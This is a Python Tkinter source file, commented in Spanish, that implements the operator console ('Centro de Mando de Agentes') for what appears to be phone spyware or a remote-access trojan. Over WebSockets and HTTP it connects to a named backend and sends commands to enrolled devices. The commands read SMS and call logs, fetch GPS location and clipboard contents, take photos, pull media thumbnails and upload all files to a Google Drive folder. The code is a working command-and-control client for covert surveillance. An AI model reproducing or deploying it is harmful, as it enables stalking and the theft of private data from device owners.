# control_panel.py (Versión Final con WebSockets v2.2)

import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
import base64
import webbrowser
import tempfile
from io import BytesIO
from PIL import Image, ImageTk
import socketio
import requests
import json

SERVER_URL = "https://edikpiccx-backend.onrender.com"
DRIVE_FOLDER_ID = "1Tux8uqv--gJjUc9_HrSZZEHsRyuzdJGO" 

class Logger:
    @staticmethod
    def info(msg): print(f"[INFO] {time.strftime('%H:%M:%S')} - {msg}")
    @staticmethod
    def error(msg): print(f"[ERROR] {time.strftime('%H:%M:%S')} - {msg}")

class ControlPanelApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Centro de Mando de Agentes v2.2 (Real-Time)")
        self.geometry("1200x800")
        
        self.photo_refs = []
        self.current_media_data = []

        # ¡NUEVO! Inicializamos el cliente de SocketIO
        self.sio = socketio.Client(logger=False, engineio_logger=False)
        self.setup_socketio_events()
        
        self.setup_gui()
        self.threaded(self.connect_to_server)

    def setup_gui(self):
        # ... (La GUI es idéntica a la que ya tienes, con las pestañas y botones) ...
        layout = ttk.PanedWindow(self, orient=tk.HORIZONTAL)
        layout.pack(fill=tk.BOTH, expand=True)
        left = ttk.Frame(layout, width=400)
        layout.add(left, weight=1)
        ttk.Label(left, text="Agentes Conectados", font=("Arial", 12, "bold")).pack(anchor="w", padx=10, pady=5)
        self.tree = ttk.Treeview(left, columns=('name', 'id'), show='headings')
        self.tree.heading('name', text='Nombre'); self.tree.heading('id', text='ID')
        self.tree.pack(fill=tk.BOTH, expand=True, padx=10)
        notebook = ttk.Notebook(left)
        notebook.pack(fill=tk.X, padx=10, pady=10)
        files_tab = ttk.Frame(notebook, padding=10)
        notebook.add(files_tab, text='Archivos')
        ttk.Button(files_tab, text="Ver Miniaturas", command=self.cmd_get_thumbnails).pack(fill=tk.X, pady=2)
        ttk.Button(files_tab, text="Subir Todo a Drive", command=lambda: self.send_command("upload_to_drive", DRIVE_FOLDER_ID)).pack(fill=tk.X, pady=2)
        remote_tab = ttk.Frame(notebook, padding=10)
        notebook.add(remote_tab, text='Control Remoto')
        ttk.Button(remote_tab, text="Obtener Estado", command=lambda: self.send_command("GET_DEVICE_STATUS")).pack(fill=tk.X, pady=2)
        ttk.Button(remote_tab, text="Obtener GPS", command=lambda: self.send_command("GET_GPS_LOCATION")).pack(fill=tk.X, pady=2)
        ttk.Button(remote_tab, text="Leer Portapapeles", command=lambda: self.send_command("GET_CLIPBOARD")).pack(fill=tk.X, pady=2)
        ttk.Button(remote_tab, text="Tomar Foto", command=lambda: self.send_command("TAKE_PHOTO")).pack(fill=tk.X, pady=2)
        data_tab = ttk.Frame(notebook, padding=10)
        notebook.add(data_tab, text='Datos')
        ttk.Button(data_tab, text="Leer SMS", command=lambda: self.send_command("GET_SMS")).pack(fill=tk.X, pady=2)
        ttk.Button(data_tab, text="Leer Llamadas", command=lambda: self.send_command("GET_CALL_LOG")).pack(fill=tk.X, pady=2)
        agent_tab = ttk.Frame(notebook, padding=10)
        notebook.add(agent_tab, text='Gestión Agente')
        ttk.Button(agent_tab, text="Pausar Subidas", command=lambda: self.send_command("pause_upload")).pack(fill=tk.X, pady=2)
        ttk.Button(agent_tab, text="Reanudar Subidas", command=lambda: self.send_command("continue_upload")).pack(fill=tk.X, pady=2)
        ttk.Button(agent_tab, text="Detener Agente", command=lambda: self.send_command("stop_agent")).pack(fill=tk.X, pady=2)
        right = ttk.Frame(layout)
        layout.add(right, weight=3)
        ttk.Label(right, text="Visor de Miniaturas", font=("Arial", 12, "bold")).pack(anchor="w", padx=10, pady=5)
        self.canvas = tk.Canvas(right, bg="#f0f0f0")
        scrollbar = ttk.Scrollbar(right, orient="vertical", command=self.canvas.yview)
        self.image_frame = ttk.Frame(self.canvas)
        self.canvas.create_window((0, 0), window=self.image_frame, anchor="nw")
        self.canvas.configure(yscrollcommand=scrollbar.set)
        self.image_frame.bind("<Configure>", lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
        self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        bar = ttk.Frame(self, padding=5)
        bar.pack(side=tk.BOTTOM, fill=tk.X)
        self.status = ttk.Label(bar, text="Conectando...", anchor=tk.W)
        self.status.pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(bar, text="Recargar Agentes (Manual)", command=lambda: self.threaded(self.refresh_agent_list_http)).pack(side=tk.RIGHT)

    def threaded(self, fn, *args):
        threading.Thread(target=fn, args=args, daemon=True).start()

    def connect_to_server(self):
        self.update_status("Conectando al servidor...", "orange")
        try:
            # La URL de conexión para Flask-SocketIO
            websocket_url = f"{SERVER_URL.replace('https', 'wss')}"
            self.sio.connect(websocket_url, transports=['websocket'],
                             socketio_path="/socket.io/",
                             headers={'type': 'panel'}) # Nos identificamos como un panel
        except Exception as e:
            self.update_status(f"Error de conexión WebSocket: {e}", "red")

    def setup_socketio_events(self):
        @self.sio.on('connect')
        def on_connect():
            self.update_status("Conectado en tiempo real.", "green")
            # Pedimos la lista inicial por si había agentes conectados antes que nosotros
            self.threaded(self.refresh_agent_list_http)

        @self.sio.on('disconnect')
        def on_disconnect():
            self.update_status("Desconectado del servidor.", "red")

        @self.sio.on('agent_list_updated')
        def on_agent_list_updated(data):
            # Recibimos la lista actualizada del servidor y refrescamos la tabla
            self.after(0, self.update_agent_list, data)
            self.update_status(f"{len(data)} agentes conectados (actualización en vivo).", "green")

        @self.sio.on('data_from_agent')
        def on_data_from_agent(response_str):
            response = json.loads(response_str) # El servidor envía un string JSON
            event = response.get('event')
            data = response.get('data')
            agent_name = response.get('agent_name', 'Agente')
            
            if event == 'thumbnails_data':
                self.current_media_data = data
                self.render_thumbnails()
            else:
                # Para otros datos, los mostramos en un popup
                pretty_data = json.dumps(data, indent=2, ensure_ascii=False)
                self.after(0, lambda: messagebox.showinfo(f"Datos de {agent_name} ({event})", pretty_data))

    def refresh_agent_list_http(self):
        # Esta función ahora es solo para la carga inicial o el botón manual
        self.update_status("Recargando lista de agentes...", "blue")
        try:
            r = requests.get(f"{SERVER_URL}/api/get-agents", timeout=30)
            self.update_agent_list(r.json())
        except Exception as e:
            self.update_status(f"Error obteniendo agentes: {e}", "red")

    def update_agent_list(self, agents):
        self.tree.delete(*self.tree.get_children())
        for agent in agents:
            self.tree.insert('', 'end', iid=agent['id'], values=(agent.get('name', 'N/A'), agent['id']))

    def cmd_get_thumbnails(self):
        # ¡YA NO HAY ESPERA! Solo enviamos el comando. La respuesta llegará por WebSocket.
        self.send_command("GET_THUMBNAILS")
        self.clear_thumbnails()
        self.update_status("Solicitando miniaturas...", "blue")

    def render_thumbnails(self):
        self.clear_thumbnails()
        if not self.current_media_data:
            self.after(0, lambda: ttk.Label(self.image_frame, text="El agente no devolvió archivos o no tiene.").pack())
            return
        for idx, item in enumerate(self.current_media_data):
            self.after(0, lambda i=idx, it=item: self.create_thumbnail_widget(i, it))
        self.update_status(f"Mostrando {len(self.current_media_data)} miniaturas.", "green")

    def create_thumbnail_widget(self, index, item):
        try:
            img_data = base64.b64decode(item['small_thumb_b64'])
            img = Image.open(BytesIO(img_data))
            img.thumbnail((100, 100))
            photo = ImageTk.PhotoImage(img)
            self.photo_refs.append(photo)
            
            frame = ttk.Frame(self.image_frame, padding=5)
            frame.pack(anchor="w", padx=5, pady=5)
            btn = tk.Button(frame, image=photo, command=lambda i=index: self.open_large_preview(i))
            btn.pack(side=tk.LEFT)
            ttk.Label(frame, text=item['filename'], wraplength=400).pack(side=tk.LEFT, padx=10)
        except Exception as e:
            print(f"Error renderizando miniatura: {e}")

    def open_large_preview(self, index):
        try:
            item = self.current_media_data[index]
            img_data = base64.b64decode(item['large_thumb_b64'])
            with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp_file:
                tmp_file.write(img_data)
                webbrowser.open(f"file://{tmp_file.name}")
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo abrir la vista previa: {e}")

    def clear_thumbnails(self):
        self.after(0, lambda: [w.destroy() for w in self.image_frame.winfo_children()])
        self.photo_refs.clear()
        self.current_media_data.clear()

    def send_command(self, action, payload=""):
        agent_id = self.selected_agent()
        if not agent_id: return
        cmd = {"target_id": agent_id, "action": action, "payload": payload}
        self.threaded(self._post_command, cmd)

    def _post_command(self, cmd):
        try:
            requests.post(f"{SERVER_URL}/api/send-command", json=cmd, timeout=15)
        except Exception as e:
            self.update_status(f"Error enviando comando: {e}", "red")

    def selected_agent(self):
        try: 
            return self.tree.selection()[0]
        except IndexError:
            messagebox.showwarning("Atención", "Selecciona un dispositivo.")
            return None

    def update_status(self, text, color="black"):
        self.after(0, lambda: self.status.config(text=text, foreground=color))

if __name__ == "__main__":
    Logger.info("Iniciando Centro de Mando v3.0 (Real-Time)...")
    app = ControlPanelApp()
    app.mainloop()
